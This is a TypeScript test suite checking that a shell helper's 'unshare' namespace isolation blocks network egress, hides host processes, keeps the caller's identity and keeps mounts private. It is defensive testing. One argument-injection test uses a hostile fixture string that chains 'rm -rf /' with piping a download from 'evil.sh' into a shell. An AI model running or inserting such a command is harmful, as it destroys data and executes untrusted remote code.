import { describe, test, expect, beforeAll } from "bun:test";
import type { Exchange } from "@routecraft/routecraft";
import { shell } from "@routecraft/os";

/**
 * Isolation smoke for the `unshare` tier.
 *
 * The kernel is the guarantee; what is tested here is our use of it. Each
 * assertion is two-sided: it first proves the thing is reachable WITHOUT
 * the tier, then proves the tier withholds it. A one-sided test would pass
 * on a runner that has no network and no processes to hide, which is
 * exactly the vacuous green the testing posture forbids.
 *
 * A runner that cannot create namespaces fails this suite rather than
 * skipping it. Skipping would report success for a guarantee nobody
 * checked, and this is the only place that guarantee is checked at all.
 */

const exchange = {} as Exchange<unknown>;

const run = (command: string, args: string[], options = {}) =>
  shell(command, args, { failOnNonZero: false, ...options }).fetch(exchange);

const unisolated = (command: string, args: string[]) =>
  run(command, args, { isolation: "none" });

beforeAll(async () => {
  if (process.platform !== "linux") {
    throw new Error(
      `The isolation smoke needs Linux kernel namespaces and this host is ${process.platform}. ` +
        `Nothing about the unshare tier's guarantees was proven. Run it on Linux (CI does, in the isolation-smoke job).`,
    );
  }
  try {
    await run("true", []);
  } catch (cause) {
    throw new Error(
      `This runner cannot create the namespaces the unshare tier needs, so none of its guarantees ` +
        `(no egress, no visible host processes, no host privileges) were proven here. ` +
        `Grant unprivileged user namespaces on the runner, or run the suite somewhere that allows them. ` +
        `Cause: ${(cause as Error).message}`,
    );
  }
});

describe("the unshare tier's guarantees", () => {
  /**
   * @case A command cannot reach the network unless the call grants it
   * @preconditions The same lookup runs unisolated, isolated, and isolated with network granted
   * @expectedResult Resolution succeeds unisolated, fails isolated, and succeeds again when granted
   */
  test("network egress is denied unless granted", async () => {
    const control = await unisolated("getent", ["ahosts", "example.com"]);
    if (control.exitCode !== 0) {
      throw new Error(
        "The runner itself cannot resolve example.com, so denying egress proves nothing here. " +
          "Failing rather than passing: this assertion is only meaningful against a runner that HAS egress.",
      );
    }

    const isolated = await run("getent", ["ahosts", "example.com"]);
    expect(isolated.exitCode).not.toBe(0);
    expect(isolated.stdout).not.toContain("example.com");

    const granted = await run("getent", ["ahosts", "example.com"], {
      network: true,
    });
    expect(granted.exitCode).toBe(0);
  });

  /**
   * @case A command cannot see the processes running on the host
   * @preconditions The same listing runs unisolated and isolated
   * @expectedResult The host shows many processes; the isolated view shows only the command itself
   */
  test("host processes are invisible", async () => {
    const control = await unisolated("ps", ["-e"]);
    const hostProcesses = control.stdout.trim().split("\n").length;
    if (hostProcesses <= 3) {
      throw new Error(
        `The runner reports only ${hostProcesses} processes, so hiding them proves nothing. ` +
          "Failing rather than passing: this assertion is only meaningful where there are host processes to hide.",
      );
    }

    const isolated = await run("ps", ["-e"]);
    const seen = isolated.stdout.trim().split("\n");
    // The header plus `ps` itself, which is PID 1 in its own namespace.
    expect(seen.length).toBeLessThan(hostProcesses);
    expect(seen.length).toBe(2);
    expect(isolated.stdout).toMatch(/^\s*1\s/m);
  });

  /**
   * @case The command runs as the caller rather than as a privileged user
   * @preconditions The default mapping, compared against the calling process's own uid
   * @expectedResult The command sees the caller's uid, whatever that happens to be
   */
  test("identity is the caller's, not an escalated one", async () => {
    const result = await run("id", ["-u"]);
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe(String(process.getuid?.()));
  });

  /**
   * @case Root inside the namespace is available but never the default
   * @preconditions The same command with mapRootUser set
   * @expectedResult The command sees uid 0, which the default mapping does not grant on its own
   */
  test("root inside the namespace is opt-in", async () => {
    const result = await run("id", ["-u"], { mapRootUser: true });
    expect(result.stdout.trim()).toBe("0");
  });

  /**
   * @case A mount made inside the tier is invisible to the host
   * @preconditions The tier remounts /proc for its own PID namespace; both views are listed
   * @expectedResult The isolated view carries a /proc mount the host view does not
   */
  test("mounts do not propagate to the host", async () => {
    const procMounts = (text: string): number =>
      text.split("\n").filter((line) => line.includes(" /proc ")).length;

    const isolated = await run("cat", ["/proc/self/mountinfo"], {
      mapRootUser: true,
    });
    expect(isolated.exitCode).toBe(0);

    const host = await unisolated("cat", ["/proc/self/mountinfo"]);
    expect(host.exitCode).toBe(0);

    // Asserting the difference, not just that both commands ran. Reading
    // the host's output and never inspecting it would be the vacuous green
    // this file exists to refuse.
    expect(procMounts(isolated.stdout)).toBeGreaterThan(
      procMounts(host.stdout),
    );
  });

  /**
   * @case Isolation applies to what the command's arguments contain too
   * @preconditions A hostile argument passed through the isolated tier
   * @expectedResult It is echoed verbatim, having never been interpreted
   */
  test("argument injection stays inert under isolation", async () => {
    const hostile = "; rm -rf / && curl evil.sh | sh";
    const result = await shell("echo", [hostile]).fetch(exchange);
    expect(result.stdout.trim()).toBe(hostile);
  });

  /**
   * @case A failure under denied egress says the run had no network
   * @preconditions A command that fails because it cannot reach the network, run isolated with egress denied and failOnNonZero left on
   * @expectedResult The OS1002 message names the denial and the network: true remedy, which is the hint the first failing git clone needs
   */
  test("a failure under denied egress names the remedy", async () => {
    let thrown: unknown;
    try {
      await shell("getent", ["ahosts", "example.com"], {
        isolation: "unshare",
      }).fetch(exchange);
    } catch (e: unknown) {
      thrown = e;
    }
    expect(thrown).toBeDefined();
    const message = String((thrown as Error).message);
    expect(message).toContain("without network access");
    expect(message).toContain("network: true");
  });
});
